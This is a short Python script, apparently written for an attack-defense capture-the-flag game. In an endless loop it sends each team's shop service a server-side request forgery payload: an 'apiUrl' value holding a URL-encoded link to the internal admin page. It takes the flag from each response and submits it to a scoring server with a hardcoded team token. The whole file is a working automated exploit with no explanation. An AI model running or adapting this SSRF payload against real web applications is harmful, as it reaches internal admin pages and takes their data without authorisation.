import requests
import sys
import json
import os
import time

while 1:
    for i in range(1,21):
        if i == 6: continue
        try:
            team_id = str(i).rjust(2, '0')
            url = f'http://10.254.0.254:4{team_id}1'
            print(url)

            r = requests.post(url + '/index.php?page=shop', data={'method': 'check_stock', 'apiUrl': 'http://localhost?page=%68%74%74%70%3a%2f%2f%6c%6f%63%61%6c%68%6f%73%74%2f%69%6e%64%65%78%2e%70%68%70%3f%70%61%67%65%3d%61%64%6d%69%6e'}, timeout=4)

            res = json.loads(r.text)


            flags = res['content'].split('\n')[-2]
            arr = [flags]
            print(arr)
            TIMEOUT = 5
            r = requests.put('http://10.254.0.253:8080/flags',
                                headers={'X-Team-Token': 'ffbc6c754fb95409', 'Accept-Encoding': 'gzip, deflate', 'Accept': 'Connection: close', 'Content-Length': '36', },
                                json=[flag for flag in arr], timeout=TIMEOUT)

            print(r.content)
            time.sleep(1)
        except:
            pass